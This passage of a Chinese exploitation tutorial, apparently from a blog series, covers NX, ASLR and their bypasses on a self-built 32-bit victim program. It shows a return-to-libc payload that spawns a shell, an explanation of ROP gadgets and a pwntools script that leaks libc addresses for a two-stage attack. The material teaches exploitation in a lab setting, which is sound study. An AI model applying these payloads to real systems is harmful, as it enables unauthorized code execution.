&lt;p&gt;NX, Non-Executable(Windows中称为DEP), 顾名思义, 就是将内存中重要的&lt;br/&gt;数据结构标记为不可执行. 而这些数据结构里, 就包括了上节说到的Full RELRO&lt;br/&gt;下的&lt;code&gt;.got.plt&lt;/code&gt;表, 以及我们挚爱的栈.&lt;/p&gt;
&lt;h2 id=&quot;思路&quot;&gt;思路&lt;/h2&gt;
&lt;p&gt;让我们再次回到最开始的&lt;code&gt;victim.c&lt;/code&gt;中, 这次编译时明确指定栈不可执行(-z noexecstack):&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;gcc victim.c -o victim_nx -g -m32 -masm=intel -no-pie -fno-stack-protector -z noexecstack &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;之前已经介绍了怎么利用&lt;code&gt;jmp esp&lt;/code&gt;来执行payload, 可是这时候栈已经是不可执行的了,&lt;br/&gt;之前的方式便不再可用. 等等..虽然栈不可执行, 可我们还是可以控制返回地址啊!&lt;br/&gt;天涯何处无芳草, 何必总在栈上搞. 别忘了, 之前我们说过如何计算出libc中的函数地址,&lt;br/&gt;那直接跳转到system函数不就可以了? 当然, 跳转之前要先做好栈的布局, 根据调用约定,&lt;br/&gt;只要把要调用的函数的参数从右到左压入栈中即可.&lt;/p&gt;
&lt;h2 id=&quot;实践&quot;&gt;实践&lt;/h2&gt;
&lt;p&gt;为了更具体地说明利用过程, 以刚编译的&lt;code&gt;victim_nx&lt;/code&gt;为例, 让我们来尝试继续exploit之.&lt;br/&gt;首先再次确定下该二进制的安全选项, 并用之前的&lt;code&gt;De Brujin&lt;/code&gt;序列来fuzzy下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ gdb ./victim_nx
...
Reading symbols from ./victim_nx...done.
(gdb) source ~/tools/peda/peda.py 
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ run
Starting program: /home/pan/victim_nx
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAAN
...
Stopped reason: SIGSEGV
0x41494141 in ?? ()
gdb-peda$ p $eip
$1 = (void (*)()) 0x41494141&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到溢出覆盖点还是从第23字节开始. 这次为了方便直接找现成的函数和字符串地址:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;gdb-peda$ p system
$2 = {&amp;lt;text variable, no debug info&amp;gt;} 0xf7e2bb30 &amp;lt;system&amp;gt;

gdb-peda$ searchmem /bin/sh\x00
Searching for '/bin/sh\x00' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f4de48 (&quot;/bin/sh&quot;)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;所以, 我们只要把返回地址写为system函数的地址(0xf7e2bb30), 并且保证跳转前栈顶&lt;br/&gt;的值(esp)为&quot;/bin/sh&quot;(0xf7f4de48)即可. 注意一般函数在epilogue阶段会恢复栈帧:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;sourceCode asm&quot;&gt;
&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;span class=&quot;co&quot;&gt;; leave&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;esp&lt;/span&gt;, &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebp&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;; ret&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;pop&lt;/span&gt; eip&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ret结束之后, esp往上加4字节, 所以返回地址之后第一个4字节应该是system的返回地址,&lt;br/&gt;这个可以先随便写, 这里用BBBB来填充(但是请记住这个地址,我们在介绍ASLR时会用到);&lt;br/&gt;第二个4字节则是system的最后一个(只有一个)参数地址, payload如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;...[22字节]+[0xf7f4de48]+[4字节]+[0xf7e2bb30]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;整数换算成小端字节序, 测试如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ (python -c 'print &quot;A&quot;*22 + &quot;\x30\xbb\xe2\xf7&quot; + &quot;B&quot;*4 + &quot;\x48\xde\xf4\xf7&quot;' &amp;amp;&amp;amp; cat) | ./victim_nx 
hello AAAAAAAAAAAAAAAAAAAAAA0���H���H���
whoami
pan
uname -a
Linux debian 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64 GNU/Linux&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;getshell成功, 而且是不是感觉payload更加精简了? :)&lt;/p&gt;
&lt;h2 id=&quot;rop&quot;&gt;ROP&lt;/h2&gt;
&lt;p&gt;除了跳转到&lt;code&gt;system&lt;/code&gt;函数, 还有些常用的比如&lt;code&gt;mprotect&lt;/code&gt;(win下的VirtualProtect),&lt;br/&gt;可以重新给内存添加执行权限. 事实上我们可以跳转到任意加载的函数, 但最常用的还是libc,&lt;br/&gt;所以, 这种方法又称之为&lt;a href=&quot;https://en.wikipedia.org/wiki/Return-to-libc_attack&quot;&gt;Return-to-libc攻击&lt;/a&gt;.&lt;br/&gt;除此之外, 还可以跳转到PLT中, 称为&lt;code&gt;Return-to-plt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;那么, 如果我们就是想执行自己写的shellcode(汇编), 又该如何操作? 这种利用方式则&lt;br/&gt;称为ROP(Return-oriented programming), 面向返回的编程, 起源于OOP面向对象编程盛行&lt;br/&gt;的年代, 颇有点黑色幽默的意思.&lt;/p&gt;
&lt;p&gt;好吧扯远了, 那么到底什么是ROP? 回想NX的保护, 虽然指定了我们的栈不可执行,&lt;br/&gt;但程序空间中可以执行的地方也很多, 如果把这些地方的代码片段按顺序拼凑起来,&lt;br/&gt;不就可以执行我们想要的功能了吗? 举个例子, 我们溢出后想执行以下的shellcode:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode asm&quot;&gt;
&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebx&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;写在栈空间里是不行了, 不过我们如果能在程序自身的代码中找到这段shellcode,&lt;br/&gt;然后跳转到上面不就行啦? 对于一两条指令还好, 分分钟可以找到匹配的地方,&lt;br/&gt;可对于较多的指令, 就没那么容易找到完整匹配了. 因此, 聪明的黑客想了个办法,&lt;br/&gt;我们不是可以覆盖栈空间吗? 那么在栈上多写几个地址, 将他们通过&lt;code&gt;ret&lt;/code&gt;指令再&lt;br/&gt;串起来不就可以了? 每个地址对应一个片段, 都以ret为结尾. 比如上述shellcode,&lt;br/&gt;我一下子找不到匹配, 但是可以分开找:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;sourceCode asm&quot;&gt;
&lt;code class=&quot;sourceCode fasm&quot;&gt;&lt;span class=&quot;co&quot;&gt;; 片段1&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;eax&lt;/span&gt;, &lt;span class=&quot;bn&quot;&gt;0x01&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;ret&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;; 片段2&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;ebx&lt;/span&gt;, &lt;span class=&quot;dv&quot;&gt;66&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;co&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;ret&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;按照排列组合不断细分, 最终找到符合的一种分法. 通过在栈上依次写入这些片段的&lt;br/&gt;地址, 就能将其连起来执行:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;---栈溢出---&amp;gt;
.............[片段1地址(返回地址)][片段2地址]...[片段N地址]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里的每个指令片段通常称为&lt;code&gt;Gadget&lt;/code&gt;. 手工寻找合适的ROP Gadget是个费时费力的过程,&lt;br/&gt;不过这种重复劳动可以很容易的 用脚本来完成, 一些成熟的辅助工具如&lt;a href=&quot;https://github.com/corelan/mona&quot;&gt;moan.py&lt;/a&gt;,&lt;br/&gt;&lt;a href=&quot;https://github.com/sashs/ropper&quot;&gt;ropper&lt;/a&gt;, &lt;a href=&quot;https://github.com/Gallopsled/pwntools&quot;&gt;pwntools&lt;/a&gt;, &lt;a href=&quot;https://github.com/radare/radare2&quot;&gt;radare2&lt;/a&gt;,&lt;br/&gt;都提供了寻找ROP Gadget的功能, 极大提高了exploit的效率.&lt;/p&gt;

&lt;p&gt;不知道大家有没有发现, 我们上面对于漏洞的利用, 大多是需要执行某个系统函数,&lt;br/&gt;而这个函数的地址, 是通过加载基地址加上一个固定的偏移决定的, 查看基地址:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ LD_TRACE_LOADED_OBJECTS=1 ./victim
    linux-gate.so.1 (0xf7fd7000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xf7df1000)
    /lib/ld-linux.so.2 (0xf7fd9000)
$ LD_TRACE_LOADED_OBJECTS=1 ./victim
    linux-gate.so.1 (0xf7fd7000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xf7df1000)
    /lib/ld-linux.so.2 (0xf7fd9000)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查看了两次发现libc的加载地址都是0xf7df1000, 在这个基础上, 我们的exploit才得以&lt;br/&gt;写入固定的system函数地址来执行.&lt;/p&gt;
&lt;p&gt;但是, 出现了一种称为&lt;a href=&quot;https://en.wikipedia.org/wiki/Address_space_layout_randomization&quot;&gt;ASLR(Address space layout randomization)&lt;/a&gt;的技术,&lt;br/&gt;被用来缓解缓冲溢出漏洞的利用. 其功能和名字一样, 实现地址空间的随机化, 效果如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
$ LD_TRACE_LOADED_OBJECTS=1 ./victim
    linux-gate.so.1 (0xf7748000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xf7562000)
    /lib/ld-linux.so.2 (0xf774a000)
$ LD_TRACE_LOADED_OBJECTS=1 ./victim
    linux-gate.so.1 (0xf7728000)
    libc.so.6 =&amp;gt; /lib/i386-linux-gnu/libc.so.6 (0xf7542000)
    /lib/ld-linux.so.2 (0xf772a000)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Linux提供了三种ASLR的模式(&lt;code&gt;/proc/sys/kernel/randomize_va_space&lt;/code&gt;):&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;0 – No randomization. Everything is static.
1 – Conservative randomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
2 – Full randomization. In addition to elements listed in the previous point, memory managed through brk() is also randomized.&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;启用ASLR之后, 每次动态链接库的加载基地址就不再是个固定值了, 从而加大了利用难度.&lt;br/&gt;同一个程序, 在启用ASLR的情况下, 三次执行的内存映射可能如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;       First execution            Second Execution           Third Execution

  +   +------------------+       +------------------+       +------------------+
  |   |                  |       |                  |       |                  |
  |   |                  |       +------------------+       |                  |
  |   +------------------+       |   executable     |       |                  |
  |   |   executable     |       |                  |       +------------------+
  |   |                  |       +------------------+       |   executable     |
  |   +------------------+       |                  |       |                  |
  |   |                  |       |                  |       +------------------+
  |   |                  |       +------------------+       |                  |
  |   |                  |       |                  |       +------------------+
  |   |                  |       |      heap        |       |                  |
  |   +------------------+       |                  |       |      heap        |
  |   |                  |       +------------------+       |                  |
  |   |      heap        |       |                  |       +------------------+
  |   |                  |       |                  |       |                  |
  |   +------------------+       |                  |       |                  |
  |   |   libraries      |       |                  |       +------------------+
  |   |                  |       |                  |       |   libraries      |
  |   +------------------+       |                  |       |                  |
  |   |                  |       +------------------+       +------------------+
  |   |                  |       |   libraries      |       |                  |
  |   |                  |       |                  |       |                  |
  |   |                  |       +------------------+       |                  |
  |   |                  |       |                  |       +------------------+
  |   |                  |       +------------------+       |                  |
  |   |                  |       |                  |       |      Stack       |
  |   +------------------+       |      Stack       |       |                  |
  |   |                  |       |                  |       |                  |
  |   |      Stack       |       |                  |       +------------------+
  |   |                  |       +------------------+       |                  |
  |   |                  |       |                  |       |                  |
  |   +------------------+       |                  |       |                  |
  |   |                  |       |                  |       |                  |
  v   +------------------+       +------------------+       +------------------+&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;实现-1&quot;&gt;实现&lt;/h2&gt;
&lt;p&gt;对于Linux, ASLR也是在内核中实现的. 正因如此, 我们可以有幸从源码中一窥其究竟.&lt;br/&gt;在内核加载并运行一个可执行文件(ELF)时, 调用了&lt;a href=&quot;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/fs/binfmt_elf.c&quot;&gt;/fs/binfmt_elf.c&lt;/a&gt;&lt;br/&gt;文件中的&lt;code&gt;load_elf_binary&lt;/code&gt;函数, 这里抽取其关键部分来看看:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;13&quot;&gt;
&lt;pre class=&quot;sourceCode c&quot;&gt;
&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span class=&quot;dt&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;int&lt;/span&gt; load_elf_binary(&lt;span class=&quot;kw&quot;&gt;struct&lt;/span&gt; linux_binprm *bprm)
{
&lt;span class=&quot;co&quot;&gt;//...&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!(current-&amp;gt;personality &amp;amp; ADDR_NO_RANDOMIZE) &amp;amp;&amp;amp; randomize_va_space)
        current-&amp;gt;flags |= PF_RANDOMIZE;
&lt;span class=&quot;co&quot;&gt;//...&lt;/span&gt;
    &lt;span class=&quot;co&quot;&gt;/* Do this so that we can load the interpreter, if need be.  We will&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;       change some of these later */&lt;/span&gt;
    retval = setup_arg_pages(bprm, randomize_stack_top(STACK_TOP),
                 executable_stack);
&lt;span class=&quot;co&quot;&gt;//...&lt;/span&gt;
    &lt;span class=&quot;co&quot;&gt;/* N.B. passed_fileno might not be initialized? */&lt;/span&gt;
    current-&amp;gt;mm-&amp;gt;end_code = end_code;
    current-&amp;gt;mm-&amp;gt;start_code = start_code;
    current-&amp;gt;mm-&amp;gt;start_data = start_data;
    current-&amp;gt;mm-&amp;gt;end_data = end_data;
    current-&amp;gt;mm-&amp;gt;start_stack = bprm-&amp;gt;p;

    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; ((current-&amp;gt;flags &amp;amp; PF_RANDOMIZE) &amp;amp;&amp;amp; (randomize_va_space &amp;gt; &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;)) {
        current-&amp;gt;mm-&amp;gt;brk = current-&amp;gt;mm-&amp;gt;start_brk =
            arch_randomize_brk(current-&amp;gt;mm);
&lt;span class=&quot;ot&quot;&gt;#ifdef compat_brk_randomized&lt;/span&gt;
        current-&amp;gt;brk_randomized = &lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;基本上符合之前对&lt;code&gt;randomize_va_space&lt;/code&gt;的介绍, 栈的初始化通过&lt;code&gt;setup_arg_pages()&lt;/code&gt;&lt;br/&gt;来实现； 启用Full Randomization时, brk()函数的地址通过&lt;code&gt;arch_randomize_brk()&lt;/code&gt;&lt;br/&gt;来进行初始化.&lt;br/&gt;一步步追踪下去可以看到每个函数的具体实现, 关键的实现在&lt;a href=&quot;https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/drivers/char/random.c#l1342&quot;&gt;/drivers/char/random.c&lt;/a&gt;&lt;br/&gt;中的&lt;code&gt;randomize_page()&lt;/code&gt;函数中:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;15&quot;&gt;
&lt;pre class=&quot;sourceCode c&quot;&gt;
&lt;code class=&quot;sourceCode c&quot;&gt;&lt;span class=&quot;co&quot;&gt;/*&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * NOTE: Historical use of randomize_range, which this replaces, presumed that&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * @start was already page aligned.  We now align it regardless.&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; *&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * Return: A page aligned address within [start, start + range).  On error,&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; * @start is returned.&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt; */&lt;/span&gt;
&lt;span class=&quot;dt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;long&lt;/span&gt;
randomize_page(&lt;span class=&quot;dt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;long&lt;/span&gt; start, &lt;span class=&quot;dt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;long&lt;/span&gt; range)
{
    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (!PAGE_ALIGNED(start)) {
        range -= PAGE_ALIGN(start) - start;
        start = PAGE_ALIGN(start);
    }

    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (start &amp;gt; ULONG_MAX - range)
        range = ULONG_MAX - start;

    range &amp;gt;&amp;gt;= PAGE_SHIFT;

    &lt;span class=&quot;kw&quot;&gt;if&lt;/span&gt; (range == &lt;span class=&quot;dv&quot;&gt;0&lt;/span&gt;)
        &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; start;

    &lt;span class=&quot;kw&quot;&gt;return&lt;/span&gt; start + (get_random_long() % range &amp;lt;&amp;lt; PAGE_SHIFT);
}&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;通过传入起始地址和范围, 返回一个在改范围内随机的(且对其的)地址.&lt;br/&gt;想详细了解的同学可以参考&lt;a href=&quot;https://0x00sec.org/t/exploit-mitigation-techniques-address-space-layout-randomization-aslr/5452&quot;&gt;0x00sec安全团队ricksanchez同学的这篇文章&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;绕过方法-1&quot;&gt;绕过方法&lt;/h2&gt;
&lt;h3 id=&quot;爆破-1&quot;&gt;爆破&lt;/h3&gt;
&lt;p&gt;ASLR的设计愿景很美好, 但不是完美的. 尤其是在32位地址空间中, 其中一个&lt;br/&gt;缺陷就是被内存碎片问题限制了ASLR的实现. 从前面的内存映射图中可以看到,&lt;br/&gt;地址空间被切分为几个大块, 其中留下了一些小空隙. 而程序或者动态库加载入&lt;br/&gt;内存时, 通常要求一定大小的连续空间, 这么一来, 虽然地址可以随机化,&lt;br/&gt;但也只能在一个较小的范围内操作.&lt;/p&gt;
&lt;p&gt;ASLR的可靠性是建立在地址随机且无法猜测的基础上, 但较小的随机范围,&lt;br/&gt;就可以通过暴力猜测有限的次数来获得, 用术语来说就是, 熵太低. 通常32位系统&lt;br/&gt;可提供随机的地址空间也就只有16位, 通常可以在几分钟内爆破出来. 当然,&lt;br/&gt;前提是程序不能在中途崩溃退出. 这个问题在64位系统下稍微有所缓解,&lt;br/&gt;但也并不是绝对的.&lt;/p&gt;
&lt;h3 id=&quot;泄露地址&quot;&gt;泄露地址&lt;/h3&gt;
&lt;p&gt;绕过ASLR的方法, 其实和绕过Canary有点类似. 在程序的一次运行过程中,&lt;br/&gt;地址空间的布局只在被加载时随机化&lt;strong&gt;一次&lt;/strong&gt;, 所以在运行过程中, 先在第一阶段&lt;br/&gt;获取实际的地址, 再第二阶段构造相应的payload就可以实现上述的利用.&lt;/p&gt;
&lt;p&gt;这里还是以上节使用的&lt;code&gt;victim_nx&lt;/code&gt;为例, 来说明如果在ASLR情况下利用.&lt;br/&gt;再次看下运行时候的选项:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ gdb ./victim_nx
(gdb) source ~/tools/peda/peda.py
gdb-peda$ aslr on 
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ aslr 
ASLR is ON&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们的计划分为两步, 第一步和之前绕过NX时Return-to-libc类似, 还记得之前让大家&lt;br/&gt;记住的那个地址吗, 就是我们填充为BBBB的那个. 我们还是用类似的方法, 不过这次是&lt;br/&gt;Return-to-plt, 第一轮攻击后栈布局如下:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;...[22字节]+[puts@plt]+[entry_point]+[puts@got]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;mailto:这样的作用是调用puts@plt&quot;&gt;这样的作用是调用puts@plt&lt;/a&gt;, &lt;a href=&quot;mailto:其输入参数为puts@got&quot;&gt;其输入参数为puts@got&lt;/a&gt;, 且调用结束后返回程序的入口点.&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;为什么是puts? 因为这里已知程序中用到puts函数(printf实际上调用了puts),&lt;br/&gt;如果是新程序可以通过&lt;code&gt;readelf --relocs ./victim_nx&lt;/code&gt;来查看重定向.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;之前都是用单行python来输出payload, 这次由于有分步骤多次交互, 所以就写一个&lt;br/&gt;python脚本来测试和利用, 为了方便用&lt;a href=&quot;https://github.com/Gallopsled/pwntools&quot;&gt;pwntools框架&lt;/a&gt;先写个基本框架:&lt;/p&gt;
&lt;div class=&quot;sourceCode&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;sourceCode py&quot;&gt;
&lt;code class=&quot;sourceCode python&quot;&gt;&lt;span class=&quot;co&quot;&gt;# exp.py&lt;/span&gt;
&lt;span class=&quot;co&quot;&gt;# -*- coding: utf-8 -*-&lt;/span&gt;
&lt;span class=&quot;im&quot;&gt;from&lt;/span&gt; pwn &lt;span class=&quot;im&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;# 地址&lt;/span&gt;
puts_plt &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x8048350&lt;/span&gt;
puts_got &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x804a010&lt;/span&gt;
entry_point &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;bn&quot;&gt;0x8048390&lt;/span&gt;

&lt;span class=&quot;kw&quot;&gt;def&lt;/span&gt; main():
    p &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; process(&lt;span class=&quot;st&quot;&gt;'./victim_nx'&lt;/span&gt;)
    &lt;span class=&quot;co&quot;&gt;# stage 1&lt;/span&gt;
    payload &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'A'&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;dv&quot;&gt;22&lt;/span&gt;
    ropchain &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; p32(puts_plt)
    ropchain &lt;span class=&quot;op&quot;&gt;+=&lt;/span&gt; p32(entry_point)
    ropchain &lt;span class=&quot;op&quot;&gt;+=&lt;/span&gt; p32(puts_got)
    payload &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; payload &lt;span class=&quot;op&quot;&gt;+&lt;/span&gt; ropchain
    log.info(&lt;span class=&quot;st&quot;&gt;'payload: {}'&lt;/span&gt;.&lt;span class=&quot;bu&quot;&gt;format&lt;/span&gt;(&lt;span class=&quot;bu&quot;&gt;repr&lt;/span&gt;(payload)))
    p.clean()
    p.sendline(payload)
    p.recvlines(&lt;span class=&quot;dv&quot;&gt;1&lt;/span&gt;)  &lt;span class=&quot;co&quot;&gt;#先忽略掉正常输出的一行&lt;/span&gt;
    leak &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; p.recv(&lt;span class=&quot;dv&quot;&gt;4&lt;/span&gt;)
    leak &lt;span class=&quot;op&quot;&gt;=&lt;/span&gt; u32(leak)
    log.info(&lt;span class=&quot;st&quot;&gt;'puts@plt is at: 0x{:x}'&lt;/span&gt;.&lt;span class=&quot;bu&quot;&gt;format&lt;/span&gt;(leak))
    p.clean()

&lt;span class=&quot;cf&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;'__main__'&lt;/span&gt;:
    main()&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们需要填入三个地址, 分别是&lt;code&gt;puts@plt&lt;/code&gt;, &lt;code&gt;puts@got&lt;/code&gt;和程序入口点&lt;code&gt;entry_point&lt;/code&gt;.&lt;br/&gt;如果禁用了位置无关(-no-pie)编译, 可执行文件本身还是会加载到绝对虚拟地址的:&lt;br/&gt;&lt;a href=&quot;mailto:查看puts@plt的地址&quot;&gt;查看puts@plt的地址&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;objdump -d -j .plt ./victim_nx | grep puts
08048350 &amp;lt;puts@plt&amp;gt;:&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;a href=&quot;mailto:查看puts@got的地址&quot;&gt;查看puts@got的地址&lt;/a&gt;:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;readelf --relocs ./victim_nx | grep puts
0804a010  00000207 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;查看起始地址:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ readelf -h ./victim_nx | grep Entry
  Entry point address:               0x8048390&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行两次看看:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ python exp.py 
[+] Starting local process './victim_nx': pid 32682
[*] payload: 'AAAAAAAAAAAAAAAAAAAAAAP\x83\x04\x08\x90\x83\x04\x08\x10\xa0\x04\x08'
[*] puts is at: 0xf7558870
[*] Stopped process './victim_nx' (pid 32682)
$ python exp.py 
[+] Starting local process './victim_nx': pid 32689
[*] payload: 'AAAAAAAAAAAAAAAAAAAAAAP\x83\x04\x08\x90\x83\x04\x08\x10\xa0\x04\x08'
[*] puts is at: 0xf75b7870
[*] Stopped process './victim_nx' (pid 32689)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到两次输出的puts地址都不一样, 所以我们无法在运行前预测到这个地址.&lt;br/&gt;第一阶段完成了, 输出了puts的地址并回到程序起点. 因为只是跳转到程序起点&lt;br/&gt;而不是重启程序, 所以这次我们可以利用输出的puts地址进行第二阶段的利用.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二阶段&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;根据输出的puts地址, 我们可以根据其想对于libc的偏移, 计算出libc基址,&lt;br/&gt;然后根据libc基址, 获得system函数和&quot;/bin/sh&quot;字符串的地址, 最后跳转执行.&lt;br/&gt;第二阶段的payload和普通的ret2libc差不多:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;...[22字节][system地址(返回地址)][4字节][&quot;/bin/sh&quot;地址]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;为此, 我们需要知道三者的偏移量, 这里用&lt;a href=&quot;https://github.com/radare/radare2&quot;&gt;radare2&lt;/a&gt;套件中的rabin2和rafind2:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;$ rabin2 -s /lib/i386-linux-gnu/libc.so.6 | egrep 'puts|system'
435 0x0005f870 0x0005f870   WEAK   FUNC  509 puts
1461 0x0003ab30 0x0003ab30   WEAK   FUNC   55 system
$ rafind2 -z -s /bin/sh /lib/i386-linux-gnu/libc.so.6
0x15ce48&lt;/code&gt;
&lt;/pre&gt;
